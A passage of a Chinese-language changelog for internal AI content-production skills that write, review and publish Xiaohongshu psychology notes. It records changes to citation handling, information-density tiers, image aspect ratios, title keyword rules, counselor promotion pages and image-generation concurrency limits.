拿普通括号当标记必然误伤）；`nbdpsy-seo-artical-creator` 新增**第 4 步「引用落地」**（撰写之后、preflight 之前）：
扫描 → 对账 → 去重编号 → 替换 → 生成参考文献区与 `citations` → 自检 → 报告。中间态标记**绝不进成品**，残留即 FAIL。

**反编造防线**（本次架构调整的最大风险，三处加固）：
- **素材清单落盘** `$WS/drafts/{slug}.sources.md`（五字段：简称/作者机构/年份/URL 逐字最终形态/口径原文）。
  引用落地是**独立子代理**，没有写作那段对话历史——不落盘它就只能靠联网现查，而那正是编造风险最高的分支。
  **缺清单 = 打回查证步，⛔ 不许改走联网自查。**
- **对不上清单时三选一**：写法不同就对上 / 联网确认真实存在则补进并标注「**引用阶段新增、未经查证轮**」（审查端逐条重点复核）/
  查不到就**打回写作端**并写明查了哪个源、什么关键词、返回为空。⛔ 绝不编造 URL、绝不拿"标题像"的网页凑数、绝不静默删标记。
- **两项「引用 agent 修不动」的 fail 一律打回写作端**：`R3`（统计句数取决于写作端）与 `R6`（同 URL 合并后条数会下降）——
  ⛔ **绝不许用联网现查去凑够 R6**，否则「合并重复条目」这条规矩反而把 agent 推向它要防的那件事。
  由此反推：**素材清单要按「合并后仍 ≥6」留余量**（一般备 8 条以上）。

配套：新增 `scripts/cite_scan.py`（扫描/候选编号/残留闸门，剥 frontmatter 与围栏代码块，与审查端判据同源）
＋ `tests/test_cite_scan.py` 8 条回归；`publish_post.py` 批量模式排除 `*.sources.md`
（否则清单会被 glob 进批量发布、恒定 exit 1，久了会诱导运营把清单挪走——那正好毁掉落盘这条地基）。

### 笔记数据分析：先读响应里的 `field_meta`

`nbdpsy-guide` 第 3 步⑥：`GET /api/accounts/{id}/note-trends` 的 `meta.field_meta` 已上线，
**18 个字段逐个**给 `label` / `desc`（平台官方原文）/ `window` / `unit` / `source`。**读数前先读它，别按字段名猜含义。**

- `window` 三值：`T`（实时）/ `T-1`（每天更新，截至昨日）/ **`unknown`（我们没核实过——不是默认值，别当成 T 或 T-1 去推算）**。
- **跨 `window` 的字段相除得不到真实比率**（分子分母不同期）：已知 `views/exposure` **算不出** `cover_ctr`、
  `follow_rate` **系统性偏低**。想看曝光转化就自己算 `views/exposure`，**只是别叫它 CTR**。
- 两者对不上是正常的，且**偏差方向会相反**（新笔记实算偏高、老笔记偏低），别据此判定数据有误。

---

## [1.37.0] — 2026-07-26

### 信息密度档位化：默认 200–400 字，**运营指明就按运营的来**

老板口径：「每一页的信息密度默认 200–400，但如果用户指明了，那就按照运营说的做——比如运营说低信息密度，
那就每一页不要超过 100 字；运营说每一页不超过 50 字，那也照做。」运营还会用「一页表达几个核心观点」
这类说法表达密度。

**五个结构化字段**（写进 `00-overview.md` 开头 + 每篇 post 的 frontmatter，缺一不可）：
`信息密度档位`（`默认` / `运营指定`）、`每页文字量`、`每页信息点`、`版式档`（`满版` / `少格` / `大字报`）、`运营原话`。

**归一化表**（运营自然语言 → 档位参数，见 `nbdpsy-xiaohongshu-creator/SKILL.md` 第 1 步）：
不说 = 200–400 字 / 6–10 点 / 满版档；「低信息密度」= ≤120 字 / 3–4 点 / 少格档；
「每页不超过 N 字」按 N 折算；「一页 M 个核心观点」= ≤M×40 字 / M 个；「一页只讲一件事」= ≤60 字 / 1 个 / 大字报档。

- **`版式档` 是第 5 个字段、创作端归一化时定死、审查端直接读不再自行推导**。理由：运营最自然的说法
  「一页 2–3 个核心观点」声明出来是 `2–3 个`，**横跨少格档（3–5）与大字报档（1–2）**，两端各推一次必然分叉。
  **声明值为区间时按下界落档**（`2–3` → 大字报档）——宁可豁免不可误判。
- **三档版式联动**：满版档 = 17 种版式全适用、满版铺陈；少格档 = 只用白名单 5 种（对比图/象限/流程/概念定义卡/程度光谱）、
  格内二次加密降级为「每格 1 图 + 1 句」、**不要求混用满 3 种**；大字报档 = 一个大主视觉 + 一句核心话（≤20 字）+ 至多一个副标注，
  **「一页只有 1–2 条 = FAIL」「17 种版式之一」「混用 3–5 种」三条整体停用**（整本同形态是运营点的菜）。
- **判据上下限不对称**：默认档的 400 是**我们自己的版式经验值**（且"高密度必崩"已于 2026-07-25 实测证伪），
  **超了绝不判 FAIL**；运营指定的数是**产品意图**，超了 = 没执行指令，**判 FAIL（major）**。两端都写了这个理由。
- **只约束内容页 P2…P(N-1)**：封面 P1 与末页 PN 始终精简、不受档位管。末页必须承载
  「行动建议 + 品牌一句 + 12356」（实测 48–67 字），不豁免会被自己的脚本判死。
- **与「材料让步方式 A/B/C」的优先级**：先定档位、再算素材承载力；**运营已指定密度时让步方式 B（减密度）停用**，
  只能走 A（减篇数）或 C（默认，减页数）。

创作端（`SKILL.md` 第 1 步与第 3 步、`illustration-spec.md` 第 2/3 节）与审查端
（`checklist-note.md` 判据 6）逐字同源；`count_xhs.py` 新增 `--density-max` / `--density-points`
做确定性检查（**仅运营指定档跑**，默认档没有硬上限、跑了必误判）。

### 发布文案提高 emoji 比例（3–6 → **8–14**），正文少用双引号

- **emoji**：目标区间由「全文 3–6 个」提高到「**每篇 ~300 字正文 8–14 个**」，FAIL 线上移到
  「超过 18 个，或 >2/3 的行有 emoji」。质量护栏原样保留：一处叠 ≥3 个、高唤起/带货款
  （🔥💥😱❗‼️💯🉐🎁）、花哨分隔线与装饰 bullet、**危机声明那段不挂 emoji**。
  调性说明改为「选温和款（🌱🫧🌙☁️💭🤍🌿）、避高唤起款；**数量可以多，气质要稳**」。
- **双引号收敛**（图内 + 正文）：只保留"真的是某人说出口/心里那句原话"的引号（气泡、独白）；
  用来强调、指代术语、打反讽的一律去掉。图内一页成对引号 ≤2 处。
  ⚠️ **提示词里用来标记"这段字要渲染进图"的那对引号是语法标记，绝对不动**——删了模型就不知道哪些字要入图。

### 画布声明对齐真实出图：3:4（1080×1440）→ **2:3（1024×1536）**

**这是 2026-07-26 那批一整轮返工的根因**：spec 要求提示词写「竖版 3:4 构图（1080×1440）」，
而后端 `/api/op/consistent-images` 实际出 1024×1536——模型按 3:4 规划版面、成图落到更高的 2:3 画布上，
内容被顶到上下边缘。无论提示词怎么写"留出底部安全区"都没用（5 页 5 败）。

- `render_preview.py` 的比例切换正则改为**同时认新旧两种标准句**（存量 post 里全是旧句，改窄了老笔记切换会静默失效）；
  按钮与 hint 文案改「小红书 2:3（1024×1536）」，**内部键值 `'3:4'`/localStorage 保持不动**（老用户缓存不失效）。
- **`check_images.py` 修 bug**：原判定 `3:4 ±2%`，而原生 1024×1536 偏差 11% → **撤销补边后每批图跑确定性检查都必然 exit 1**。
  改为接受 **2:3 与 3:4 两个合法比例**（各 ±2%），最短边下限 1080 → **1024**（否则原生图被误杀）。补了 6 条回归用例。
- **视频参考图（§6）保持 3:4 不变**——它喂给 `nbdpsy-text-to-video` 的 image2video（按 3:4 推算 834×1112），
  跟着轮播改会脱钩。

### 只有封面需要守安全区；崩字的真规律是**强制折行**

- **只有封面 P1 会被 feed 按 3:4 裁**（标题/副标题落在 y≈85–1450）；**P2–PN 在详情页轮播按完整比例展示，
  不设安全区、不为此让版面**。原模板那句「距上边缘 ≥150px、距下边缘 ≥200px」已作废。
- **别用提示词控制像素级边距**（2026-07-26 实测：注入安全区约束后底部留白中位数只从 21px 变成 17px）。
  封面避让靠**构图描述**（"标题压在上 1/4 区""底部留出大片空白不放文字"）。
- **崩字与文字块总量无关**（那条已于 2026-07-25 证伪），与**单个文字块是否被迫折行**强相关：
  窄竖 pill / 窄色带 / 小徽章里放 ≥5 字的词组 = 高危，模型会强行折成多行网格并在折行处重复或丢字。
  **同一处反复崩字不要重掷**——那是版式在逼模型出错。三招消因按有效性排序：
  ① 换掉反复出错的那几个字（等义改写，一次即净）② 消除强制折行（缩到 4 字内或容器改横贯单行）
  ③ 把被夹住的窄横带**整条移走**（实测"给它腾地方"无效，崩点坐标依然崩）。
- 全局硬要求下压到 22 条模板「要求」行：**图中全部文字使用简体中文，不得繁体或异体**（本批出现过 數 / 軟）。

### 批次锚点可审计

批次锚点落盘到 `{note_dir}/_shared/BATCH_ANCHOR.txt`，所有出图/重出统一
`--anchor-url "$(cat {note_dir}/_shared/BATCH_ANCHOR.txt)"`；审查端逐篇比对
`images/post-NN/.gen_images_state.json` 里的 `anchor_url`，对不上 = 该篇风格基准漂了。
**只适用于走路线 0（后端一致性出图）的批次**——手工/宿主出图与存量笔记豁免。

### 笔记数据分析：分析前先读响应里的字段口径

`nbdpsy-guide` 第 3 步⑥ 补口径说明：`exposure` 是 **T-1**（截至昨日）、`views` 是 **T**（实时）、
`cover_ctr` 是 **T-1÷T-1**（且分子是封面点击次数、排除视频下滑曝光）。三者口径不同，
`views/exposure` 与 `cover_ctr` 对不上是正常的，**偏差方向还会相反**（新笔记实算偏高、老笔记偏低），
别据此判定数据有误。想看曝光转化自己算 `views/exposure` 就好，**只是别叫它 CTR**。
其余 8 个指标的时间窗尚未逐个核实——**响应里没写就是没核实，别假设**。
（已给 server 提需求：把 `meta.field_notes` 升级为逐字段的 `meta.field_meta`，未核实的显式标 `unknown`。）

---

## [1.36.0] — 2026-07-26

### 小红书标题改版：从「纯场景钩子」到「核心议题词 + 场景钩子」，关键词优先占位

老板口径：标题应该更直白地表达内容核心，便于获取长尾搜索流量，而不只是一个场景。

**问题**：旧规则的标题只写场景钩子——四类钩子示例（「3 个迹象说明你可能…」「总说自己想太多？」「我后悔没早点知道这件事」「i 人必看」）**一个可搜索的议题词都没有**。读者在小红书**搜**「童年情感忽视」「追逃循环」「复杂性创伤」时，这批标题一条都命不中。推荐流曝光是平台给的、会波动；搜索流量是长尾的、复利的，而标题是它唯一的入口。

**新结构：「核心议题词（目标长尾关键词）＋ 场景钩子」——关键词优先占位，钩子退居后半段。**

- **四条硬判据**（`references/xiaohongshu-spec.md` §1「标题」重写）：20 字硬限不变；**前 10 字内必须完整出现该篇目标长尾词**；**字数不够时砍钩子、不砍关键词**（本次改版的核心取舍，无例外）；长尾词必须是源长文真实覆盖的议题，**不许硬蹭**
- 四类钩子保留为**后半段的可选修饰**，每类给出「改前（纯钩子）→ 改后（带关键词）」对照表；三个标准形态：冒号式 / 竖线式 / 疑问式
- **选词优先级**：非诊断议题词（童年情感忽视 / 追逃循环 / 情绪内耗）优先；诊断级术语（CPTSD / 回避型依恋）只在它本身就是读者搜法时进标题
- ⚠️ **唯一放松的护栏**：§1.5 P2 的「术语不得进标题」改为「术语可作**搜索入口**进标题」——**不得作落点、不得写成自测句式、正文仍最多出现一次**这三条一条没松。代价已在 spec 内写明（站内 CPTSD 集群日均浏览全站最低、零预约关联）

### 封面页主/副标题分工定死

`references/illustration-spec.md` 三层组件模板的文字层：**主标题 ＝ 核心议题词**（与发布标题同源、字号最大）、**副标题 ＝ 场景钩子**（那句共情句），**两者不得重复同一层意思**（主答"讲什么"、副答"关我什么事"）。第 5 节 P1 封面范例原本主副写反（主"总说自己想太多？"／副"也许是复杂性创伤"），已调换。咨询师推介笔记不适用（其封面主标题是姓名）。

### `00-overview.md` 新增「目标长尾词」字段（每篇必填 1–2 个）

SKILL.md 第 1 步：长尾词在**规划阶段**定死（不是写标题时临时想一个），来源只有源长文真实覆盖的议题、一套内彼此不重复，并**串起三处**——标题前 10 字 / 标签行 / 正文自然出现。第 1 步验证清单加了对应检查项。

### `count_xhs.py` 新增可选参数 `--title-keyword`

```bash
python3 scripts/count_xhs.py <post.md> --title-keyword "童年情感忽视"
```

- 传了才校验：关键词须**完整**落在标题前 10 字内（结束位置 ≤10），不满足 → `ok_title=false` + exit 2，原因写在新字段 `title_reason`；另新增 `title_keyword` / `title_keyword_pos`（0 基下标，未命中 -1）
- 大小写不敏感（`cptsd` 命中 `CPTSD`）；口径与 `title_chars` 一致（先剔 emoji 再定位）
- **不传该参数时行为与历史版本完全一致**（只校 20 字硬限），既有调用不会变红
- 唯一例外：传了关键词却没有 frontmatter title → 判 false（显式要求校验就不静默放行）；不传时仍按历史放行
- 单测 5 条（向后兼容 / 前置命中 + 大小写 / 挤到 10 字后 / 关键词缺失 / 无 frontmatter）

### 审查端同步

- `nbdpsy-content-reviewer/references/checklist-note.md`：确定性检查命令带上 `--title-keyword`；判据 0② 标题口径**反转**（纯场景钩子标题现在一律 FAIL，只剩议题词的"没钩子"标题不判 FAIL）；判据 0④「术语进标题 = FAIL」改为「术语**做落点**或标题写成自测句式 = FAIL」；判据 3 标签双写增加"必须含目标长尾词"
- `evals/evals.json` 两条 rubric 与 overview 字段同步；`assets/example-xhs-note.md` 标题与封面主副标题按新规范改写（改前「一句"方案再改改"，我在工位上僵住了」正是本次要淘汰的形态）

### 补充（同版）：撤销补边、成图纠错纪律、回撤线

- **不做补边，就用 1024×1536（2:3）竖版直发**（老板 2026-07-26 定案）：它在小红书是合法比例、
  详情页轮播按原比例完整显示；**裁切只影响 feed 封面缩略图这一页**，内容页与末页的危机声明、
  G2 分流句在详情页完整可见。因此只需 **P1 封面**构图时把标题主体放中部，**内容页不必为此让步版面**。
  `pad_to_3x4.py` 与其单测一并删除（不留死代码）。
  仍保留的结论：**别用提示词控制像素级边距**（实测底部留白中位 21px→17px 毫无改善），封面避让靠构图描述。
- **成图有问题时的唯一改法**：改初始提示词 + 带**原锚点图**整页重出；⛔ 绝不能把错图当参考图喂回去、
  或追加提示词在错图上迭代——① 一致性锚的是那张已确认的 P1，换锚会让整套基准漂掉；
  ② 模型会继承错图的错误特征、在错的基础上改是固化错误；③ 成图带着已渲染的中文与版式，
  当 anchor 会把定死的排版当风格基准传下去。**锚点图自始至终只有一张。** 审查端同步该处置口径。
- **标题改版补回撤线**：关键词前置换走了最值钱的前 10 字，推荐流点击率大概率下降。
  两条触发任一即退回混合策略：① 推荐流曝光跌到旧口径 1/3 且搜索来源占比没起来；
  ② 术语类标题搜索流量上来但**预约关联仍为零**（判据二须单独盯预约关联、不能只看流量）。


---

## [1.35.0] — 2026-07-25

### 材料不足时的三种让步方式，默认「减每篇页数」

上一版只实现了「减篇数」一种应对，把选择权收走了。现改为三选一、并给出各自的参数区间：

| | 让步什么 | 保全什么 | 参数 |
|---|---|---|---|
| **C · 减页数（默认）** | 每篇 6–9 页 → 4–6 页 | 篇数、每页密度 | 每页仍 6–10 信息点、200–400 字 |
| **A · 减篇数** | 5–8 篇 → 台账实撑数 | 每篇页数、每页密度 | 可少于 5 篇 |
| **B · 减密度** | 每页 6–10 点 → 4–6 点 | 篇数、每篇页数 | 文字 200–400 → 120–250 字 |

- **默认 C**（老板定案）：篇数与每页密度是产量与质量的底线，页数最可让；A/B 需运营点名才切换
- 无论走哪种，都要在 `00-overview.md` 开头写明一行「材料让步方式」
- **审查端（checklist-note 判据 6）先读该行再判**，按对应区间判、不按默认区间判 FAIL——
  否则走 B 的 4–6 个信息点会被误判「密度不足」、走 C 的 4 页会被误判「页数不够」
- 走 C 时 `count_xhs.py` 需显式传 `--page-min 4 --page-max 6`，否则按默认 6–9 误报
- 返工处置随让步方式分流：C 砍页、A 合并或砍篇、B 降该页密度

---

## [1.34.0] — 2026-07-25

### 根治「材料不够→图内灌水→删字→再加密」的返工震荡 + 出图并发按服务端升级对齐

**素材承载力核算（第 1 步新增硬闸）**：震荡的根因不在写作、在规划超发——
一篇笔记 6–9 页 × 每页 6–10 信息点，5–8 篇就是几百个信息点，而此前**没有任何环节
核算长文供不供得起**（原「原文太短才可少于 5」既无量化判据、又是事后补救）。现改为：

- 定篇数前先建**素材台账**（一页一行，写进 `00-overview.md`），每页必须填出
  **具体、独立、本篇专属**的长文出处；填不出/出处与本篇其他页或其他篇重复 → 该页划掉
- 某篇被划 ≥3 页 → 该篇材料不足，与相邻篇合并或砍掉
- **篇数 = 台账实际撑得住的数**，`5–8` 降级为上限与理想值、不再是产量指标；
  少于 5 篇属正确结果，在 overview 开头写明原因即可
- **主动少拆并说明理由 = 达标；凑够篇数但靠重复灌水 = 不达标**

**返工铁律**：删灌水必须靠**换材料**（用长文里本篇还没用过的小节填回），不靠删字——
只删不换会掉回字数下限又触发加密、来回震荡。**翻遍长文找不到可换材料 = 材料不足的确诊信号**，
退回规划步改台账与篇数，别在同一页硬凑。审查端（checklist-note 判据 6）同步该处置口径：
判到重复/灌水时 issue 须写明换材料而非删字，材料确实不足则直接建议合并或砍篇。

**出图并发**（服务端 2026-07-25 升级后对齐）：单篇内部已 10 路并发、6–9 页一波出完，
墙钟 7.5 分钟 → **约 50 秒**；篇级并发从「串行/≤6」改为**10 篇全开**（Tier 5 250 IPM，
10×10=100 并发≈120 张/分，占 48%）。429 已由服务端指数退避 3 次兜底，排障收窄为
**仅 outcome 明确报错才重出**。下标对齐与失败位留空语义不变。

---

## [1.33.4] — 2026-07-25

### 批量出图并发口径重写：从「拍脑袋 ≤6」改为「实证瓶颈 + 两个维度 + 降级信号」

1.33.2 写的「并发度 ≤6（只压测到 2 路留余量）」被实证调研推翻：**那个 6 没有任何服务端依据**，
与服务端 `BROWSER_CONCURRENCY=6` 撞名纯属巧合（那个闸只管发布/cookie 检测/导出/删除的
camoufox 浏览器，生图完全不经过它）。第 6 步「路线 0 · 后端一致性出图」第 2 条按调研结论重写：

- **写明瓶颈只有一层**：**OpenAI org 级 IPM（images per minute）配额，全服务所有运营共用同一把
  key、共享同一份配额**。其余各层实测都远未饱和——本机 32 核 62G（去水印并发实测 24 路仍富余）、
  隧道 7.26 MB/s（≈ 支撑 78 路）、服务端 uvicorn 单 worker 未设 `--limit-concurrency` 且生图走异步 IO。
  **反面提醒同时写入**：服务端对生图任务**没有任何并发上限**，提多少就并发轰多少上游，自律只能发生在 skill 这一层。
- **拆成两个维度分别给建议**（老板诉求是扛 20+ 运营并行）：
  - **单篇内部 = 没有可调项**。服务端 `generate_batch` 是 `for` 循环逐页 `await`（8 页 ≈ 7 分钟），
    客户端设什么并发都改不了——原文「单篇内串行」是在描述既成事实、不是参数，明确写清免得后来人白折腾。
  - **全局并行 job 数 = 全服务共享总量，不是每人各自 N**。给出公式 **可持续并发 ≈ 0.9 × IPM**
    （单页墙钟实测 46–76s 取 55s，每槽 ≈1.1 张/分钟）与 Tier 1/2/3/4 对照表（4 / 18 / 45 / 90+）。
- **不伪造确定数字**：我们在哪一档本机读不到（`/v1/models` 不返回 `x-ratelimit-*` 头），
  故写成**阶段性建议 + 爬坡方案**——**6 路起步 → 连续两批无降级信号爬到 10–12 → 不要一次开到 20**，
  别的运营同时出图时压到 ≤4 并错峰；并附管理员 30 秒查真值的入口
  （platform.openai.com/settings/organization/limits 的 `gpt-image-2` IPM），查到后按表取值。
  同时点明：6 路 ≈ 6.5 张/分钟，**若我们是 Tier 1（5 IPM）连 6 都已超限**，所以爬坡必须看信号不看感觉。
- **补齐降级信号与降到多少**：① `pages` 出现 `error`／某页 `url` 为空（**429 最典型的表现**——服务端
  无 429 退避重试，撞限额直接判该页失败、交付空位，而**整个 job 仍标记 `done` 不报错**，只能逐篇核对发现）
  ② 单页 p95 > 83s（基线 55s 的 1.5 倍）③ 同批 ≥2 篇同时出现失败页。**出现任一 → 并行篇数减半；
  降到 2 路仍复现 → 退回串行并报管理员查 IPM 档位**。并强调失败页只能用 `--pages` 补，
  整篇重跑会让已成功的页重新扣费、掉进「越重跑越限流」的循环。
- 同段落一并保留本次查证的一致性结论：服务端走**无状态 Images API（`images.edit`）**，风格一致性
  来自每张都传同一张锚点图，故调用顺序/并发与否都不影响一致性；服务端 `session_id` 只是产物目录标识
  （替换掉 1.33.2 里「每次调用现开临时容器」这个与代码不符的说法）。

**⚠️ 真正的提速杠杆在服务端、不在本 skill**（属于 nbdpsy-server 仓库的另一件事，本次未改）：
`generate_batch` 的逐页串行换成 `asyncio.gather` + **全局信号量**，一篇 8 页可从 ~7 分钟压到 ~1 分钟、
skill 侧零改动；顺序必须是**先加信号量再放开页内并行**，否则单个运营就能打出 30 job × 8 页 = 240 路轰上游。
另需补 429 分层退避、把 `x-ratelimit-remaining-images` 响应头打进日志（这是唯一能在 429 发生**之前**
预警的指标）、重新标定 `OPERATOR_PENDING_QUOTA=30`（当前 **admin 角色完全豁免**）。

---

## [1.33.3] — 2026-07-25

### 口径修正：取消「危机题材不许挂推介末页」+ 图内文字量放宽到 200–400

**① 危机议题笔记照样可以挂咨询师推介末页（题材否决闸门取消）**

老板口径：「危机相关笔记不会挂推介末页，这个取消掉。我们所有咨询师都是持证的心理咨询师，
可以应对危机干预！如果提示词里说了要推介，那就是要推介咨询师。」

- `nbdpsy-xiaohongshu-creator/references/counselor-note-spec.md` §6.2：前置判据从**两条减为
  一条**（只剩 `is_accepting=true`），删掉「本篇不是危机相关笔记」这条题材闸门；§6.7 与验证
  清单、红线速记第 6 条同步。
- `nbdpsy-xiaohongshu-creator/SKILL.md`：「两条前置闸门」改为「前置闸门只有一条」；红线 4
  末尾的题材禁令删除。
- `nbdpsy-xiaohongshu-creator/references/xiaohongshu-spec.md` **§1.5 G6 定义本身**：删掉
  「内容本身触及危机识别与转介的笔记，当篇不放商业 CTA」这半句。G6 是上面几处引用的**源规则**，
  不改这里会自相矛盾——下游说"可以挂"、G6 说"不放商业 CTA"，读到 G6 的 agent 仍会拒绝。

**⚠️ 明确保留（本次没删，以后也别拿这条改回去）**：① **危机声明 12356 照常在位**（科普笔记
既有规则不变，校验仍**不带** `--no-crisis`）；② **G6 的「声明与商业 CTA 不同页/不同屏」物理
分离保留**——推介页排在危机声明页之后本就天然满足，不需要额外限制。
**一句话：删的是「危机题材整篇不许挂推介」，留的是「声明与推介不挤在同一页」。**
G6 现在**只有排版分离一层含义**，spec 内已就近写明这个区别，防止后来者又把题材禁令加回来。

**② 内容页图内文字量建议值 200–300 → 200–400**

- `nbdpsy-content-reviewer/references/checklist-note.md` 判据 6 及其防误判条款同步为 200–400
  （仍是**建议值不是上限，任何情况下不得据此判 FAIL/major**，条款原样保留）。
- `nbdpsy-xiaohongshu-creator/references/illustration-spec.md`：出图侧还留着上一版的旧值
  **80–120**，一并对齐到 200–400——审查侧 checklist 明确要求「对照 illustration-spec 第 3 节」，
  两边不一致会让创作端按 80–120 出图、审查端按 200–400 判密度不足。
- 未动 `nbdpsy-seo-artical-creator` 与 `checklist-article.md` 里的 80–120：那是**长文 TL;DR
  首段字数**，与图内文字量是两个指标，不能一起改。

---

## [1.33.2] — 2026-07-25

### 出图提速：批量出图从「逐篇串行」放宽为「按篇并行」

- 第 6 步批量出图改为**按篇并行、单篇内串行**（并发度 ≤6，遇 429/限流降到 2 或退回串行）。
  依据：`POST /api/op/consistent-images` 只收 `prompts`+可选 `anchor_url`，**不接收
  draft_id/session_id**——session_id 由服务端每次现开临时容器，天然隔离。运营实测两个 job
  并发各 57s、墙钟 57s（串行应为 ~114s），分别拿到不同 session_id。6 篇 ~42 页由此从
  约 35 分钟压到约 6 分钟。并发上限只压测到 2 路，故建议值取 ≤6 留余量。

---

## [1.33.1] — 2026-07-25

### 修复：审查员两处误判口径（图内文字量当上限、查无出处不查权威源）

运营实测反馈的两类误判，均改在 `nbdpsy-content-reviewer/references/checklist-note.md`：

- **判据 6「内容页信息密度」**：建议值从「文字总量约 80–120 字」上调为 **「约 200–300 字」**
  （老板口径：字数太少会显得信息量不足）。并追加防误判条款——这是**版式建议值不是上限，
  任何情况下不得据此判 FAIL/major**；本条 FAIL 判据全部指向密度不足，密度偏高不在判据之列。
  明令禁止「数提示词里的引号文字块 → 超建议值 → 预测出图会错字/糊字/裁切 → 判 major」这条
  推理链：2026-07-25 已实测证伪（同批最密页 44 文字块 vs 中位页 23 块各出一张 1024×1536，
  图内中文逐字无误、手机端字号可读）。错字/糊字/裁切是**成图缺陷**，只能在图片审查阶段
  （`checklist-images.md`）对着实际 PNG 判定，笔记阶段对提示词预测出图质量属**越权推断**。
- **判据 1「事实可溯源」**：追加「判查无出处前必须查权威源，而不是查任务提示词里的摘要」——
  提示词给的事实清单常是节选，**节选之外 ≠ 不存在**。写明各类事实的权威源：科普结论与数字 →
  源 pillar 长文原文；咨询师资历/擅长/受训/执业经历/咨询小时数/同行与督导评价 →
  `fetch_counselor.py --emp <emp_no>` 实时返回（并列出 `profile_sections` 下的具体字段路径）。
  只有权威源里确实检索不到才写 blocker，且须写明查了哪个源、什么关键词、返回为空。
  起因：一批推介笔记里三条**真实存在的后台字段**（督导訾非评价、三个 styles 标签、
  个体 800+/家庭 200+ 小时）被当成编造，其中督导评价还被判成 blocker。

---

## [1.33.0] — 2026-07-25

### 新增：科普笔记末页咨询师推介页（系统头像直接合成）

科普笔记可在轮播**末尾追加 1 页**咨询师推介——素材是咨询师**自己上传到系统的头像**
（`avatar_url`），直接喂 gpt-image-2 合成，避免本地拼图错位。

- **新路径与既有「整篇推介笔记」口径分开**（counselor-note-spec 新增 §6，含两条路径对比表）：
  系统头像**上传即已授权**，**不逐次索取授权、不设「本人过目认可」发布闸门、不卡发布流程**
  （老板定案：事后有异议走下架笔记补救）。**§2 照片三铁律与本人认可闸门原样不变**，只管
  运营额外索取的照片；判据一句话「照片从哪来」。
- **取数**：`fetch_counselor.py` 新增 `--avatar-out <路径>`——`avatar_url` 是相对路径
  （`/static/avatars/xxx.jpg`），脚本自动拼 api_base 下载，目录入参自动命名
  `avatar-<emp_no>.<ext>`，JSON 追加 `avatar_local_path`；后台无头像时报错停下（不静默返
  空 anchor 白烧额度）。§0 字段表同步改口径（原写「仅参考，不作为发布素材」）。
- **出图两批 anchor 别混**：科普内容页 anchor=已确认的 P1，推介末页单出一批 anchor=头像
  图床直链（`publish_note.py --upload-images` 取直链）；**不用 compose_photo 本地拼图**。
- **末页文案就四件**：姓名（直呼其名，绝不加「老师」）+ 职称一行 ≤14 字 + 擅长方向药丸 2–4 个
  各 2–6 字 + 一句「怎么开始」≤16 字陈述句；价格默认不展示；品牌锚句不重复（只放右下角小字）。
  提示词骨架见 §6.5（比例参数写标准句，保预览页 3:4↔1:1 切换可用）。
- **合规**：这仍是科普笔记——**危机声明照常在位**（放推介页之前那一页，天然满足 G6 分离），
  校验**不带** `--no-crisis`；**危机相关笔记不加推介末页**（G6：触及危机识别与转介的当篇不
  放商业 CTA）；只对 `is_accepting=true` 的咨询师做。页数口径：内容页 6–8 + 推介 1 = 总 7–9，
  `count_xhs.py` 默认区间不用改。
- **视频衔接**：推介末页不写进「## 视频参考图提示词」节；做视频时须跳过末页
  （`parse_note.py` 无跳页开关，产出 shots.json 后删掉最后一镜）。
- 单测：`--avatar-out` 目录/文件路径命名、相对→绝对 URL 拼接、绝对 URL 不重复拼、无头像抛错、
  `--avatar-out` 单独配 `--list` 报错（全程请求层 monkeypatch，不打网）。

---

## [1.32.3] — 2026-07-25

### 发布排障：账号封禁语义 + 账号名跟随昵称（服务端行为对齐）

- 失败排障新增「账号被平台判违规处罚」判据：发布约 1 秒即返终态 `failed` 且 error 含
  封禁语义（发布被小红书阻断/违反社区规范/禁止发笔记/账号异常）＝平台处罚非技术故障；
  处理只有换号或 App 内核实，**勿重扫码（cookie 是好的）、勿重发（更强的高频封号信号）**。
  红线速记同步加第 7 条；账号管理节加专节。
- 账号管理节新增「账号名跟随小红书昵称」说明：每次 cookie 检测会把账号 name 同步成
  最新昵称，运营改名后 `--list-accounts` 显示会变，属预期行为；认账号拿不准用 id。

---

## [1.32.2] — 2026-07-24

### 推介笔记：照片只上封面，内页不再放照片

- 咨询师照片只出现在 P1 封面（运营口径定案）：出图仅 P1 传 `--anchor-url`，内页批次
  绝不带照片 anchor；P2 简历卡改纯信息图（提示词骨架去照片区，顶部改姓名条），密度
  8–10 信息点要求不变。
- 备选保真路线（compose_photo 本地合成）随之改挂封面：spec 附录改为封面底图留白模板
  （照片占顶部约 1/3，保真换构图的取舍已注明），脚本文档字符串/help 同步改口径。
- 流程与闸门同步：授权停等、成图本人认可、图审均改为围绕封面；图审新增硬判据
  「内页出现人物照片＝返工」。SKILL 速记同步。

---

## [1.32.1] — 2026-07-24

### 咨询师称呼规范：直呼其名

- 产出内容（正文/图内文字/标题）提及咨询师一律直呼其名或用她/他/TA，绝不加「老师」等
  称谓（运营口径定案）；修正 spec 展开正例与骨架表中的「黄老师」违例。

---

## [1.32.0] — 2026-07-24

### 咨询师推介场景按黄安麟篇实战反馈修订（骨架/长尾词/流派/字数/危机声明豁免）

**动机**：老板看真实产出（黄安麟推介笔记）后提五条反馈——推介是**介绍一个人**、不是科普文，此前照搬科普三段式跑偏了。逐条落实：

1. **危机声明不加**：推介笔记正文与末页图都不放「本文为心理科普…12356」——介绍一个人硬塞科普声明反而像在科普栏目里。`check_compliance.py` 加 `--no-crisis` 开关（跳过危机声明在位检查，极限词/医疗违禁/站外导流照扫）；spec 合规步骤改用 `--no-crisis`。
2. **删痛点铺垫**：`counselor-note-spec.md` §3 文案骨架从「科普三段式」整体重写为「**人物直入**」三部分——开头姓名+最硬资质直入（前 10 字立住信息），禁止「想找人聊聊又怕选错」类痛点铺垫、禁止「选咨询师其实是先认识一个人」类导语。
3. **议题展开＋埋长尾词**：擅长议题不能只列干词，每类展开成"是什么困扰＋怎么和你工作"并至少嵌 1 个后台真实覆盖的长尾词（原生家庭创伤→CPTSD/复杂性创伤、亲密关系→依恋修复/追逃循环…，绝不硬蹭）；标签 3–6 个里必含核心议题长尾词；简历卡图上药丸保持 2–6 字短词，长尾词由文案承载。
4. **写明受训流派**：主体新增「受训流派与工作方式」一段，写出系统受训的流派名（CBT/精神动力/整合取向，取材 profile_sections 的 training/methods）+ 一句白话解释。
5. **字数更长**：正文 300 字 → **400–800 字**。`count_xhs.py` 加 `--body-min/--body-max`（默认维持 210–450 兼容科普笔记）；spec 自检命令 `count_xhs.py <post.md> --body-min 400 --body-max 800 --page-min 4 --page-max 6`。

